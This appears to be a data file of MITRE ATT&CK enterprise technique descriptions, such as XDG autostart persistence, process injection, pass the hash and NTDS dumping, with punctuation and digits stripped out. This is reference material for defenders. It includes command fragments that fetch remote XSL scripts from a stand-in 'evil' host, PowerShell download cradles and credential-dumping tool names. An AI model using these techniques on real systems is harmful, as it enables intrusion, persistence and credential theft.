attack-pattern--e0232cb0-ded5-4c2e-9dc7-2893142a5c11,['enterprise-attack'],['T1547.013'],XDG Autostart Entries,adversaries may modify xdg autostart entries to execute programs or commands during system boot  linux desktop environments that are xdg compliant implement functionality for xdg autostart entries  these entries will allow an application to automatically start during the startup of a desktop environment after user logon  by default  xdg autostart entries are stored within the  etc xdg autostart or   _config autostart directories and have a _desktop file extension_ citation  free desktop application autostart feb        within an xdg autostart entry file  the type key specifies if the entry is an application  type     link  type    or directory  type     the name key indicates an arbitrary name assigned by the creator and the exec key indicates the application and command line arguments to execute_ citation  free desktop entry keys   adversaries may use xdg autostart entries to maintain persistence by executing malicious commands and payloads  such as remote access tools  during the startup of a desktop environment  commands included in xdg autostart entries with execute after user logon in the context of the currently logged on user  adversaries may also use  to make xdg autostart entries look as if they are associated with legitimate programs 
attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5,['enterprise-attack'],['T1584.004'],Server,adversaries may compromise third party servers that can be used during targeting  use of servers allows an adversary to stage  launch  and execute an operation  during post compromise activity  adversaries may utilize servers for various tasks  including for command and control  instead of purchasing a  or  virtual private  adversaries may compromise third party servers in support of operations_  adversaries may also compromise web servers to support watering hole operations  as in  drive by
attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db,['enterprise-attack'],['T1526'],Cloud Service Discovery,an adversary may attempt to enumerate the cloud services running on a system after gaining access  these methods can differ from platform as a service  paas   to infrastructure as a service  iaas   or software as a service  saas   many services exist throughout the various cloud providers and can include continuous integration and continuous delivery  ci cd   lambda functions  azure ad  etc    adversaries may attempt to discover information about the services enabled throughout the environment  azure tools and apis  such as the azure ad graph api and azure resource manager api  can enumerate resources and services  including applications  management groups  resources and policy definitions  and their relationships that are accessible by an identity_ citation  azure   resource manager api  citation  azure ad graph api   stormspotter is an open source tool for enumerating and constructing a graph for azure resources and services  and pacu is an open source aws exploitation framework that supports several methods for discovering cloud services_ citation  azure   stormspotter  citation  github pacu 
attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00,['enterprise-attack'],['T1151'],Space after Filename,adversaries can hide a program's true filetype by changing the extension of a file  with certain file types  specifically this does not work with _app extensions   appending a space to the end of a filename will change how the file is processed by the operating system  for example  if there is a mach o executable file called evil_bin  when it is double clicked by a user  it will launch terminal_app and execute  if this file is renamed to evil_txt  then when double clicked by a user  it will launch with the default text editing application  not executing the binary   however  if the file is renamed to  evil_txt    note the space at the end   then when double clicked by a user  the true file type is determined by the os and handled appropriately and the binary will be executed  citation  mac backdoors are back     adversaries can use this feature to trick users into double clicking benign looking files of any format and ultimately executing something malicious 
attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735,['enterprise-attack'],['T1018'],Remote System Discovery,adversaries may attempt to get a listing of other systems by ip address  hostname  or other logical identifier on a network that may be used for lateral movement from the current system  functionality could exist within remote access tools to enable this  but utilities available on the operating system could also be used such as   or net view using   adversaries may also analyze data from local host files  ex  c  windows system   drivers etc hosts or  etc hosts  or other passive means  such as local  cache entries  in order to discover the presence of remote systems in an environment_  adversaries may also target discovery of network infrastructure as well as leverage  network device  commands on network devices to gather detailed information about systems within a network  e_g  show cdp neighbors  show arp _ citation  cisa ar      a fivehands may      
attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88,['enterprise-attack'],['T1046'],Network Service Discovery,adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices  including those that may be vulnerable to remote software exploitation  common methods to acquire this information include port and or vulnerability scans using tools that are brought onto a system_ citation  cisa ar      a fivehands may           within cloud environments  adversaries may attempt to discover services running on other cloud hosts  additionally  if the cloud environment is connected to a on premises environment  adversaries may be able to identify services running on non cloud systems as well_  within macos environments  adversaries may use the native bonjour application to discover services running on other macos hosts within a network  the bonjour mdnsresponder daemon automatically registers and advertises a host s registered services on the network  for example  adversaries can use a mdns query  such as dns sd  b _ssh__tcp _  to find other systems broadcasting the ssh service_ citation  apple doco bonjour description  citation  macos apt activity bradley 
attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d,['enterprise-attack'],['T1590.001'],Domain Properties,adversaries may gather information about the victim's network domain s  that can be used during targeting  information about domains and their properties may include a variety of details  including what domain s  the victim owns as well as administrative data  ex  name  registrar  etc_  and more directly actionable information such as contacts  email addresses and phone numbers   business addresses  and name servers_  adversaries may gather this information in various ways  such as direct collection actions via  active  or  phishing for  information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets  ex   dns dumpster  citation  circl passive dns  where third party cloud providers are in use  this information may also be exposed through publicly available api endpoints  such as getuserrealm and autodiscover in office     environments_ citation  azure active directory reconnaisance  citation  office     azure domain availability  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open technical   search open  or  phishing for  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex 
attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58,['enterprise-attack'],['T1518'],Software Discovery,adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment  adversaries may use the information from  software  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  adversaries may attempt to enumerate software for a variety of reasons  such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to  exploitation for privilege
attack-pattern--e49920b0-6c54-40c1-9571-73723653205f,['enterprise-attack'],['T1538'],Cloud Service Dashboard,an adversary may use a cloud service dashboard gui with stolen credentials to gain useful information from an operational cloud environment  such as specific services  resources  and features  for example  the gcp command center can be used to view all assets  findings of potential security risks  and to run additional queries  such as finding public ip addresses and open ports_ citation  google command center dashboard   depending on the configuration of the environment  an adversary may be able to enumerate more information via the graphical dashboard than an api  this allows the adversary to gain information without making any api requests 
attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744,['enterprise-attack'],['T1055.005'],Thread Local Storage,adversaries may inject malicious code into processes via thread local storage  tls  callbacks in order to evade process based defenses as well as possibly elevate privileges  tls callback injection is a method of executing arbitrary code in the address space of a separate live process    tls callback injection involves manipulating pointers inside a portable executable  pe  to redirect a process to malicious code before reaching the code's legitimate entry point  tls callbacks are normally used by the os to setup and or cleanup data used by threads  manipulating tls callbacks may be performed by allocating and writing to specific offsets within a process  memory space using other  process  techniques such as  process  fireeye tls nov        running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via tls callback injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--e4dc8c01-417f-458d-9ee0-bb0617c1b391,['enterprise-attack'],['T1622'],Debugger Evasion,adversaries may employ various means to detect and avoid debuggers  debuggers are typically used by defenders to trace and or analyze the execution of potential malware payloads_ citation  processhacker github   debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment  similar to  virtualization sandbox  if the adversary detects a debugger  they may alter their malware to disengage from the victim or conceal the core functions of the implant  they may also search for debugger artifacts before dropping secondary or additional payloads_  specific checks will vary based on the target and or adversary  but may involve  native  function calls such as isdebuggerpresent   and  ntqueryinformationprocess    or manually checking the beingdebugged flag of the process environment block  peb   other checks for debugging artifacts may also seek to enumerate hardware breakpoints  interrupt assembly opcodes  time checks  or measurements if exceptions are raised in the current process  assuming a present debugger would  swallow  or handle the potential error _ citation  hasherezade debug  citation  alkhaser debug  citation  vxunderground debug   adversaries may use the information learned from these debugger checks during automated discovery to shape follow on behaviors  debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping  native  function calls such as outputdebugstringw  _ citation  wardle evilquest partii  citation  checkpoint dridex jan      
attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86,['enterprise-attack'],['T1036.006'],Space after Filename,adversaries can hide a program's true filetype by changing the extension of a file  with certain file types  specifically this does not work with _app extensions   appending a space to the end of a filename will change how the file is processed by the operating system_  for example  if there is a mach o executable file called evil_bin  when it is double clicked by a user  it will launch terminal_app and execute  if this file is renamed to evil_txt  then when double clicked by a user  it will launch with the default text editing application  not executing the binary   however  if the file is renamed to evil_txt   note the space at the end   then when double clicked by a user  the true file type is determined by the os and handled appropriately and the binary will be executed  citation  mac backdoors are back _  adversaries can use this feature to trick users into double clicking benign looking files of any format and ultimately executing something malicious 
attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e,['enterprise-attack'],['T1547.007'],Re-opened Applications,adversaries may modify plist files to automatically run an application when a user logs in  when a user logs out or restarts via the macos graphical user interface  gui   a prompt is provided to the user with a checkbox to  reopen windows when logging back in _ citation  re open windows on mac  when selected  all applications currently open are added to a property list file named com_apple_loginwindow_ uuid _plist within the   library preferences byhost directory_ citation  methods of mac malware persistence  citation  wardle persistence chapter  applications listed in this file are automatically reopened upon the user s next logon_  adversaries can establish  by adding a malicious application path to the com_apple_loginwindow_ uuid _plist file to execute payloads when a user logs in 
attack-pattern--e5d550f3-2202-4634-85f2-4a200a1d49b3,['enterprise-attack'],['T1608.006'],SEO Poisoning,adversaries may poison mechanisms that influence search engine optimization  seo  to further lure staged capabilities towards potential victims  search engines typically display results to users based on purchased ads as well as the site s ranking score reputation calculated by their web crawlers and algorithms_ citation  atlas seo  citation  malwarebytes seo   to help facilitate  drive by  adversaries may stage content that explicitly manipulates seo rankings in order to promote sites hosting their malicious payloads  such as  drive by  within search engines  poisoning seo rankings may involve various tricks  such as stuffing keywords  including in the form of hidden text  into compromised sites  these keywords could be related to the interests browsing habits of the intended victim s  as well as more broad  seasonably popular topics  e_g  elections  trending news _ citation  zscaler seo  citation  atlas seo   adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site s calculated relevance and reputation_ citation  malwarebytes seo  citation  dfir report gootloader   seo poisoning may also be combined with evasive redirects and other cloaking mechanisms  such as measuring mouse movements or serving content based on browser user agents  user language localization settings  or http headers  in order to feed seo inputs while avoiding scrutiny from defenders_ citation  zscaler seo  citation  sophos gootloader 
attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e,['enterprise-attack'],['T1550.002'],Pass the Hash,adversaries may  pass the hash  using stolen password hashes to move laterally within an environment  bypassing normal system access controls  pass the hash  pth  is a method of authenticating as a user without having access to the user's cleartext password  this method bypasses standard authentication steps that require a cleartext password  moving directly into the portion of the authentication that uses the password hash_  when performing pth  valid password hashes for the account being used are captured using a  credential  technique  captured hashes are used with pth to authenticate as that user  once authenticated  pth may be used to perform actions on local or remote systems_  adversaries may also use stolen password hashes to  overpass the hash   similar to pth  this involves using a password hash to authenticate as a user but also uses the password hash to create a valid kerberos ticket  this ticket can then be used to perform  pass the  attacks_ citation  stealthbits overpass the hash 
attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549,['enterprise-attack'],['T1052'],Exfiltration Over Physical Medium,adversaries may attempt to exfiltrate data via a physical medium  such as a removable drive  in certain circumstances  such as an air gapped network compromise  exfiltration could occur via a physical medium or device introduced by a user  such media could be an external hard drive  usb drive  cellular phone  mp  player  or other removable storage and processing device  the physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems 
attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b,['enterprise-attack'],['T1574.002'],DLL Side-Loading,adversaries may execute their own malicious payloads by side loading dlls  similar to  dll search order  side loading involves hijacking which dll a program loads  but rather than just planting the dll within the search order of a program then waiting for the victim application to be invoked  adversaries may directly side load their payloads by planting then invoking a legitimate application that executes their payload s _  side loading takes advantage of the dll search order used by the loader by positioning both the victim application and malicious payload s  alongside each other  adversaries likely use side loading as a means of masking actions they perform under a legitimate  trusted  and potentially elevated system or software process  benign executables used to side load payloads may not be flagged during delivery and or execution  adversary payloads may also be encrypted packed or otherwise obfuscated until loaded into the memory of the trusted process_ citation  fireeye dll side loading 
attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add,['enterprise-attack'],['T1105'],Ingress Tool Transfer,adversaries may transfer tools or other files from an external system into a compromised environment  tools or files may be copied from an external adversary controlled system to the victim network through the command and control channel or through alternate protocols such as  once present  adversaries may also transfer spread tools between victim devices within a compromised environment  i_e   lateral tool    files can also be transferred using various  web  as well as native or otherwise present tools on the victim system_ citation  ptsecurity cobalt dec        on windows  adversaries may use various utilities to download tools  such as  copy    finger   and  commands such as iex new object net_webclient _downloadstring   and invoke webrequest  on linux and macos systems  a variety of utilities also exist  such as  curl    scp    sftp    tftp    rsync    finger   and  wget  
attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306,['enterprise-attack'],['T1098.002'],Additional Email Delegate Permissions,adversaries may grant additional permission levels to maintain persistent access to an adversary controlled email account    for example  the add mailboxpermission  cmdlet  available in on premises exchange and in the cloud based service office      adds permissions to a mailbox_ citation  microsoft   add mailboxpermission  citation  fireeye apt         citation  crowdstrike hiding in plain sight       in google workspace  delegation can be enabled via the google admin console and users can delegate accounts via their gmail settings_ citation  gmail delegation  citation  google ensuring your information is safe    adversaries may also assign mailbox folder permissions through individual folder permissions or roles  in office     environments  adversaries may assign the default or anonymous user permissions or roles to the top of information store  root   inbox  or other mailbox folders  by assigning one or both user permissions to a folder  the adversary can utilize any other account in the tenant to maintain persistence to the target user s mail folders_ citation  remediation and hardening strategies for microsoft     to defend against unc       this may be used in persistent threat incidents as well as bec  business email compromise  incidents where an adversary can add  additional cloud  to the accounts they wish to compromise  this may further enable use of additional techniques for gaining access to systems  for example  compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules  ex   internal  so the messages evade spam phishing detection mechanisms_ citation  bienstock  d    defending o           
attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15,['enterprise-attack'],['T1588.003'],Code Signing Certificates,adversaries may buy and or steal code signing certificates that can be used during targeting  code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted  code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with_ citation  wikipedia code signing  users and or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is_  prior to  code  adversaries may purchase or steal code signing certificates for use in operations  the purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity  adversaries may also steal code signing materials directly from a compromised third party 
attack-pattern--e7eab98d-ae11-4491-bd28-a53ba875865a,['enterprise-attack'],['T1126'],Network Share Connection Removal,adversaries may remove share connections that are no longer useful in order to clean up traces of their operation  windows shared drive and  windows admin  connections can be removed when no longer needed   is an example utility that can be used to remove network share connections with the net use   system share  delete command   citation  technet net use 
attack-pattern--e848506b-8484-4410-8017-3d235a52f5b3,['enterprise-attack'],['T1648'],Serverless Execution,adversaries may abuse serverless computing  integration  and automation services to execute arbitrary code in cloud environments  many cloud providers offer a variety of serverless resources  including compute engines  application integration services  and web servers    adversaries may abuse these resources in various ways as a means of executing arbitrary commands  for example  adversaries may use serverless functions to execute malicious code  such as crypto mining malware  i_e   resource  cado security denonia  adversaries may also create functions that enable further compromise of the cloud environment  for example  an adversary may use the  iam passrole  permission in aws or the  iam_serviceaccounts_actas  permission in google cloud to add  additional cloud  to a serverless cloud function  which may then be able to perform actions the original user cannot_ citation  rhino security labs aws privilege escalation  citation  rhingo security labs gcp privilege escalation   serverless functions can also be invoked in response to cloud events  i_e   event triggered  potentially enabling persistent execution over time  for example  in aws environments  an adversary may create a lambda function that automatically adds  additional cloud  to a user and a corresponding cloudwatch events rule that invokes that function whenever a new user is created_ citation  backdooring an aws account  similarly  an adversary may create a power automate workflow in office     environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in sharepoint_ citation  varonis power automate data exfiltration  citation  microsoft dart case report     
attack-pattern--e906ae4d-1d3a-4675-be23-22f7311c0da4,['enterprise-attack'],['T1084'],Windows Management Instrumentation Event Subscription,windows management instrumentation  wmi  can be used to install event filters  providers  consumers  and bindings that execute code when a defined event occurs  adversaries may use the capabilities of wmi to subscribe to an event and execute arbitrary code when that event occurs  providing persistence on a system  adversaries may attempt to evade detection of this technique by compiling wmi scripts into windows management object  mof  files  _mof extension    citation  dell wmi persistence  examples of events that may be subscribed to are the wall clock time or the computer's uptime   citation  kazanciyan       several threat groups have reportedly used this technique to maintain persistence   citation  mandiant m trends      
attack-pattern--e99ec083-abdd-48de-ad87-4dbf6f8ba2a4,['enterprise-attack'],['T1160'],Launch Daemon,per apple s developer documentation  when macos and os x boot up  launchd is run to finish system initialization  this process loads the parameters for each launch on demand system level daemon from the property list  plist  files found in  system library launchdaemons and  library launchdaemons  citation  appledocs launch agent daemons   these launchdaemons have property list files which point to the executables that will be launched  citation  methods of mac malware persistence _   adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  citation  osx malware detection   the daemon name may be disguised by using a name from a related operating system or benign software    launch daemons may be created with administrator privileges  but are executed under root privileges  so an adversary may also use a service to escalate privileges from administrator to root_   the plist file permissions must be root wheel  but the script or program that it points to has no such requirement  so  it is possible for poor configurations to allow an adversary to modify a current launch daemon s executable and gain persistence or privilege escalation 
attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f,['enterprise-attack'],['T1055.008'],Ptrace System Calls,adversaries may inject malicious code into processes via ptrace  process trace  system calls in order to evade process based defenses as well as possibly elevate privileges  ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process    ptrace system call injection involves attaching to and modifying a running process  the ptrace system call enables a debugging process to observe and control another process  and each individual thread   including changing memory and register values_ citation  ptrace man  ptrace system call injection is commonly performed by writing arbitrary code into a running process  ex  malloc  then invoking that memory with ptrace_setregs to set the register containing the next instruction to execute  ptrace system call injection can also be done with ptrace_poketext ptrace_pokedata  which copy data to a specific address in the target processes  memory  ex  the current address of the next instruction    citation  ptrace man  citation  medium ptrace jul         ptrace system call injection may not be possible targeting processes that are non child processes and or have higher privileges_ citation  bh linux inject    running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4,['enterprise-attack'],['T1027.007'],Dynamic API Resolution,adversaries may obfuscate then dynamically resolve api functions called by their malware in order to conceal malicious functionalities and impair defensive analysis  malware commonly uses various  native  functions provided by the os to perform various tasks such as those involving processes  files  and other system artifacts_  api functions called by malware may leave static artifacts such as strings in payload files  defensive analysts may also uncover which functions a binary file may execute via an import address table  iat  or other structures that help dynamically link calling code to the shared modules that provide functions_ citation  huntress api hash  citation  ired api hashing   to avoid static or other defensive analysis  adversaries may use dynamic api resolution to conceal malware characteristics and functionalities  similar to  software  dynamic api resolution may change file signatures and obfuscate malicious api function calls until they are resolved and invoked during runtime_  various methods may be used to obfuscate malware calls to api functions  for example  hashes of function names are commonly stored in malware in lieu of literal strings  malware can use these hashes  or other identifiers  to manually reproduce the linking and loading process using functions such as  getprocaddress    and  loadlibrary     these hashes identifiers can also be further obfuscated using encryption or other string manipulation tricks  requiring various forms of  deobfuscate decode files or  during execution _ citation  blackhat api packers  citation  drakonia hinvoke  citation  huntress api hash 
attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf,['enterprise-attack'],['T1021.001'],Remote Desktop Protocol,adversaries may use  valid  to log into a computer using the remote desktop protocol  rdp   the adversary may then perform actions as the logged on user_  remote desktop is a common feature in operating systems  it allows a user to log into an interactive session with a system desktop graphical user interface on a remote system  microsoft refers to its implementation of the remote desktop protocol  rdp  as remote desktop services  rds _ citation  technet remote desktop services    adversaries may connect to a remote system over rdp rds to expand access if the service is enabled and allows access to accounts with known credentials  adversaries will likely use credential access techniques to acquire credentials to use with rdp  adversaries may also use rdp in conjunction with the  accessibility  or  terminal services  for persistence_ citation  alperovitch malware 
attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3,['enterprise-attack'],['T1037.001'],Logon Script (Windows),adversaries may use windows logon scripts automatically executed at logon initialization to establish persistence  windows allows logon scripts to be run whenever a specific user or group of users log into a system_ citation  technet logon scripts  this is done via adding a path to a script to the hkcu environment userinitmprlogonscript registry key_ citation  hexacorn logon scripts   adversaries may use these scripts to maintain persistence on a single system  depending on the access configuration of the logon scripts  either local credentials or an administrator account may be necessary 
attack-pattern--eb2cb5cb-ae87-4de0-8c35-da2a17aafb99,['enterprise-attack'],['T1055.015'],ListPlanting,adversaries may abuse list view controls to inject malicious code into hijacked processes in order to evade process based defenses as well as possibly elevate privileges  listplanting is a method of executing arbitrary code in the address space of a separate live process  code executed via listplanting may also evade detection from security products since the execution is masked under a legitimate process_  list view controls are user interface windows used to display collections of items_ citation  microsoft list view controls  information about an application's list view settings are stored within the process' memory in a syslistview   control_  listplanting  a form of message passing  shatter attack   may be performed by copying code into the virtual address space of a process that uses a list view control then using that code as a custom callback for sorting the listed items_ citation  modexp windows process injection  adversaries must first copy code into the target process  memory space  which can be performed various ways including by directly obtaining a handle to the syslistview   child of the victim process window  via windows api calls such as findwindow and or enumwindows  or other  process  methods_  some variations of listplanting may allocate memory in the target process but then use window messages to copy the payload  to avoid the use of the highly monitored writeprocessmemory function  for example  an adversary can use the postmessage and or sendmessage api functions to send lvm_setitemposition and lvm_getitemposition messages  effectively copying a payload   bytes at a time to the allocated memory_ citation  eset invisimole june         finally  the payload is triggered by sending the lvm_sortitems message to the syslistview   child of the process window  with the payload within the newly allocated buffer passed and executed as the listview_sortitems callback 
attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d,['enterprise-attack'],['T1484'],Domain Policy Modification,adversaries may modify the configuration settings of a domain to evade defenses and or escalate privileges in domain environments  domains provide a centralized means of managing how computer resources  ex  computers  user accounts  can act  and interact with each other  on a network  the policy of the domain also includes configuration settings that may apply between domains in a multi domain forest environment  modifications to domain settings may include altering domain group policy objects  gpos  or changing trust settings for domains  including federation trusts_  with sufficient permissions  adversaries can modify domain policy settings  since domain configuration settings control many of the interactions within the active directory  ad  environment  there are a great number of potential attacks that can stem from this abuse  examples of such abuse include modifying gpos to push a malicious  scheduled  to computers throughout the domain environment citation  adsecurity gpo persistence       citation  wald  guide to gpos  citation  harmj y abusing gpo permissions  or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources_ citation  microsoft   customer guidance on recent nation state cyber attacks  adversaries can also change configuration settings within the ad environment to implement a  rogue domain   adversaries may temporarily modify domain policy  carry out a malicious action s   and then revert the change to remove suspicious indicators 
attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3,['enterprise-attack'],['T1220'],XSL Script Processing,adversaries may bypass application control and obscure execution of code by embedding scripts inside xsl files  extensible stylesheet language  xsl  files are commonly used to describe the processing and rendering of data within xml files  to support complex operations  the xsl standard includes support for embedded scripting in various languages   citation  microsoft xslt script mar        adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control  similar to  trusted developer utilities proxy  the microsoft common line transformation utility binary  msxsl_exe   citation  microsoft msxsl_exe  can be installed and used to execute malicious javascript embedded within local or remote  url referenced  xsl files   citation  penetration testing lab msxsl july       since msxsl_exe is not installed by default  an adversary will likely need to package it with dropped files   citation  reaqta msxsl spearphishing mar       msxsl_exe takes two main arguments  an xml source file and an xsl stylesheet  since the xsl file is valid xml  the adversary may call the same xsl file twice  when using msxsl_exe adversaries may also give the xml xsl files an arbitrary file extension_ citation  xsl bypass mar        command line examples  citation  penetration testing lab msxsl july       citation  xsl bypass mar          msxsl_exe customers _ xml script _ xsl   msxsl_exe script _ xsl script _ xsl   msxsl_exe script _ jpeg script _ jpeg  another variation of this technique  dubbed  squiblytwo   involves using  windows management  to invoke jscript or vbscript within an xsl file_ citation  lolbas wmic  this technique can also execute local remote scripts and  similar to its   squiblydoo  counterpart  leverages a trusted  built in windows tool  adversaries may abuse any alias in  windows management  provided they utilize the  format switch_ citation  xsl bypass mar        command line examples  citation  xsl bypass mar       citation  lolbas wmic     local file  wmic process list  format evil _ xsl   remote file  wmic os get  format  https     example _ com evil _ xsl 
attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f,['enterprise-attack'],['T1596.005'],Scan Databases,adversaries may search within public scan databases for information about victims that can be used during targeting  various online services continuously publish the results of internet scans surveys  often harvesting information such as active ip addresses  hostnames  open ports  certificates  and even server banners_  adversaries may search scan databases to gather actionable information  threat actors can use online resources and lookup tools to harvest information from these services  adversaries may seek information about their already identified targets  or use these datasets to discover opportunities for successful breaches  information from these sources may reveal opportunities for other forms of reconnaissance  ex   active  or  search open  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote  or  exploit public facing
attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d,['enterprise-attack'],['T1564.001'],Hidden Files and Directories,adversaries may set files and directories to be hidden to evade detection mechanisms  to prevent normal users from accidentally changing special files on a system  most operating systems have the concept of a  hidden  file  these files don t show up when a user browses the file system with a gui or when using normal commands on the command line  users must explicitly ask to show the hidden files either via a series of graphical user interface  gui  prompts or with command line switches  dir  a for windows and ls  a for linux and macos _  on linux and mac  users can mark specific files as hidden simply by putting a  _  as the first character in the file or folder name   citation  sofacy komplex trojan   citation  antiquated mac malware   files and folders that start with a period   _   are by default hidden from being viewed in the finder application and standard command line utilities like  ls   users must specifically change settings to have these files viewable_  files on macos can also be marked with the uf_hidden flag which prevents them from being seen in finder_app  but still allows them to be seen in terminal_app   on windows  users can mark specific files as hidden by using the attrib_exe binary  many applications create these hidden files and folders to store information so that it doesn t clutter up the user s workspace  for example  ssh utilities create a _ssh folder that s hidden and contains the user s known hosts and keys_  adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files 
attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1,['enterprise-attack'],['T1578.001'],Create Snapshot,an adversary may create a snapshot or data backup within a cloud account to evade defenses  a snapshot is a point in time copy of an existing cloud compute component such as a virtual machine  vm   virtual hard drive  or volume  an adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure  unlike in  revert cloud  where an adversary may revert to a snapshot to evade detection and remove evidence of their presence_  an adversary may  create cloud  mount one or more created snapshots to that instance  and then apply a policy that allows the adversary access to the created instance  such as a firewall policy that allows them inbound and outbound ssh access_ citation  mandiant m trends      
attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867,['enterprise-attack'],['T1591.001'],Determine Physical Locations,adversaries may gather the victim's physical location s  that can be used during targeting  information about physical locations of a target organization may include a variety of details  including where key resources and infrastructure are housed  physical locations may also indicate what legal jurisdiction and or authorities the victim operates within_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets  ex   search victim owned  or  social  threatpost broadvoice leak  citation  sec edgar search  gathering this information may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   or  hardware
attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a,['enterprise-attack'],['T1137.002'],Office Test,adversaries may abuse the microsoft office  office test  registry key to obtain persistence on a compromised system  an office test registry location exists that allows a user to specify an arbitrary dll that will be executed every time an office application is started  this registry key is thought to be used by microsoft to load dlls for testing and debugging purposes while developing office applications  this registry key is not created by default during an office installation_ citation  hexacorn office test  citation  palo alto office test sofacy   there exist user and global registry keys for the office test feature     hkey_current_user software microsoft office test special perf   hkey_local_machine software microsoft office test special perf  adversaries may add this registry key and specify a malicious dll that will be executed whenever an office application  such as word or excel  is started 
attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf,['enterprise-attack'],['T1587'],Develop Capabilities,adversaries may build capabilities that can be used during targeting  rather than purchasing  freely downloading  or stealing capabilities  adversaries may develop their own capabilities in house  this is the process of identifying development requirements and building solutions such as malware  exploits  and self signed certificates  adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle_ citation  mandiant apt   citation  kaspersky sofacy  citation  bitdefender strongpity june       citation  talos promethium june        as with legitimate development efforts  different skill sets may be required for developing capabilities  the skills needed may be located in house  or may need to be contracted out  use of a contractor may be considered an extension of that adversary's development capabilities  provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability 
attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0,['enterprise-attack'],['T1173'],Dynamic Data Exchange,windows dynamic data exchange  dde  is a client server protocol for one time and or continuous inter process communication  ipc  between applications  once a link is established  applications can autonomously exchange transactions consisting of strings  warm data links  notifications when a data item changes   hot data links  duplications of changes to a data item   and requests for command execution_  object linking and embedding  ole   or the ability to link data between documents  was originally implemented through dde  despite being superseded by com  dde may be enabled in windows    and most of microsoft office      via registry keys   citation  bleepingcomputer dde disabled in word dec        citation  microsoft adv       dec        citation  microsoft dde advisory nov        adversaries may use dde to execute arbitrary commands  microsoft office documents can be poisoned with dde commands  citation  sensepost ps dde may        citation  kettle csv dde aug        directly or through embedded files  citation  enigma reviving dde jan        and used to deliver execution via phishing campaigns or hosted web content  avoiding the use of visual basic for applications  vba  macros   citation  sensepost macroless dde oct       dde could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution 
attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24,['enterprise-attack'],['T1003.003'],NTDS,adversaries may attempt to access or create a copy of the active directory domain database in order to steal credential information  as well as obtain other information about domain members such as devices  users  and access rights  by default  the ntds file  ntds_dit  is located in  systemroot  ntds ntds_dit of a domain controller_ citation  wikipedia active directory   in addition to looking for ntds files on active domain controllers  adversaries may search for backups that contain the same or similar information_ citation  metcalf        the following tools and techniques can be used to enumerate the ntds file and the contents of the entire active directory hashes_    volume shadow copy   secretsdump_py   using the in built windows tool  ntdsutil_exe   invoke ninjacopy
